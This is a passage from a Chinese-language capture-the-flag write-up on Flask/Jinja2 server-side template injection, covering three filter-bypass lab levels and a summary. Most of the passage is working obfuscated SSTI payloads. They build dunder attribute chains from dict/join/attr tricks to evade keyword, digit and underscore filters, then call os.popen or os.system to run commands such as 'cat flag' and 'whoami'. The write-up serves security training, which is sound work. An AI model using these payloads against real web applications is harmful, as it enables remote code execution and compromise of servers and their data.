同理,使用 urlencode 中还出现了百分号.在`%`被过滤时可以尝试使用这种方法进行绕过.

![image-20210927144625707](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144625707.png)

构造 payload,拿到 flag

> payload 原型:().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()[132].\_\_init\_\_.\_\_globals\_\_\[‘popen’](‘cat flag’).read()

```python
{%set a=dict(__cla=a,ss__=b)|join %}  # __class__
{%set b=dict(__bas=a,e__=b)|join %}	  # __basess__
{%set c=dict(__subcla=a,sses__=b)|join %}    # __subclasses__
{%set d=dict(__ge=a,titem__=a)|join%}    # __getitem__
{%set e=dict(__in=a,it__=b)|join %}		 # __init__
{%set f=dict(__glo=a,bals__=b)|join %}	# __globals__
{%set g=dict(pop=a,en=b)|join %}	# popen
{%set h=self|string|attr(d)(18)%}	# 空格
{%set i=(dict(cat=abc)|join,h,dict(flag=b)|join)|join%}  # cat flag
{%set j=dict(read=a)|join%} # read
{{()|attr(a)|attr(b)|attr(c)()|attr(d)(132)|attr(e)|attr(f)|attr(d)(g)(i)|attr(j)()}}
```

![image-20210927125630695](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927125630695.png)

### Level 12 bypass combination2

这一关和上一关的区别在于 没有过滤`request`,但是过滤了数字.所以可以使用`request.args`绕过.

不过`request|attr("args")|attr("a")`并不能获取到通过 get 传递过来的`a参数`,所以这里得跟换为`request.args.get()`来获取 get 参数

如果还是从`().__class__`构造,那代码段就太冗长了.通过搜索,在羽师父的博客中学到了一条简洁的构造链.

`{{x.__init__.__globals__['__builtins__']}}`

![image-20210927145707004](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927145707004.png)

构造 payload,拿到 flag

> payload 原型: x.\_\_init\_\_.\_\_globals\_\_\['\_\_builtins\_\_']['eval'](<"__import__('os').popen('whoami').read()">)

```python
{%set a={}|select|string|list%}
{%set b=dict(pop=a)|join%}
{%set c=a|attr(b)(self|string|length)%}  # _
{%set d=(c,c,dict(getitem=a)|join,c,c)|join%}  # __getitem__
{%set e=dict(args=a)|join%}		# args
{%set f=dict(get=a)|join%}		# get
{%set g=dict(z=a)|join%}
{%set gg=dict(zz=a)|join%}
{%set ggg=dict(zzz=a)|join%}
{%set gggg=dict(zzzz=a)|join%}
{%set ggggg=dict(zzzzz=a)|join%}
{{x|attr(request|attr(e)|attr(f)(g))|attr(request|attr(e)|attr(f)(gg))|attr(d)(request|attr(e)|attr(f)(ggg))|attr(d)(request|attr(e)|attr(f)(gggg))(request|attr(e)|attr(f)(ggggg))}}
```

![image-20210927125427004](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927125427004.png)

### Level 13 bypass combination3

![image-20210926143742060](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143742060.png)

这道题把`request`给 ban 了,过滤了更多关键字,不过还是可以用`Level 12`的思路

构造 payload,拿到 flag

> payload 原型:x.\_\_init\_\_.\_\_globals\_\_\['\_\_builtins\_\_'\]\['\_\_import\_\_'](‘os’).popen('cat flag').read()")

```python
{%set a={}|select|string|list%}
{%set ax={}|select|string|list%}
{%set aa=dict(ssss=a)|join%}
{%set aaa=dict(ssssss=a)|join%}
{%set aaaa=dict(ss=a)|join%}
{%set aaaaa=dict(sssss=a)|join%}
{%set b=dict(pop=a)|join%}   # pop
{%set c=a|attr(b)(aa|length*aaa|length)%}  # _
{%set cc=a|attr(b)(aaaa|length*aaaaa|length)%} # 空格
{%set d=(c,c,dict(get=a,item=a)|join,c,c)|join%}  # __getitem__
{%set dd=(c,c,dict(in=a,it=a)|join,c,c)|join%}   # __init__
{%set ddd=(c,c,dict(glob=a,als=a)|join,c,c)|join%}   # __globals__
{%set dddd=(c,c,dict(buil=a,tins=a)|join,c,c)|join%}   # __builtins__
{%set e=(c,c,dict(impo=a,rt=a)|join,c,c)|join%}   # __import__
{%set ee=(dict(o=a,s=a)|join)|join%}   # os
{%set eee=(dict(po=a,pen=a)|join)|join%}  # popen
{%set eeee=(dict(cat=a)|join,cc,dict(flag=a)|join)|join%}  # cat flag
{%set f=(dict(rea=a,d=a)|join)|join%}  # read
{{x|attr(dd)|attr(ddd)|attr(d)(dddd)|attr(d)(e)(ee)|attr(eee)(eeee)|attr(f)()}}
```

![image-20210927111652753](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927111652753.png)

## 总结

本篇文章主要介绍了`Flask`的服务端模板注入.其漏洞成因大多数是因为程序员的偷懒或者安全意识较低.

`SSTI`既然属于代码注入,那漏洞利用必然是想法设法去实现执行代码.在`Flask`中,我们可以通过类与类之间的继承关系拿到能够执行代码的函数,从而进行`RCE`.

`ssti`的基础 payload 构造形如:

`().__class__.__base__.__subclasses__()[64].__init__.__globals__['__import__']('os').system('whoami')`

但在某些特定情况下可能存在不同字符的过滤,我们需要通过 `python`的一些内在特性或内建方法,尝试对被过滤字符进行构造.上面练习已经简单实现了部分字符 bypass,但还不完全.读者可以尝试自行探索出更有趣的 payload.

关于`Flask SSTI`的防御,推荐使用更安全的`rander_template()`代替`rander_template_string()`.

学无止境,希望这边能对各位师傅们有所帮助.

## 参考

https://xz.aliyun.com/t/3679
https://www.freebuf.com/articles/web/250481.html
https://www.anquanke.com/post/id/226900
https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI
https://buaq.net/go-74232.html
https://blog.csdn.net/miuzzx/article/details/110220425
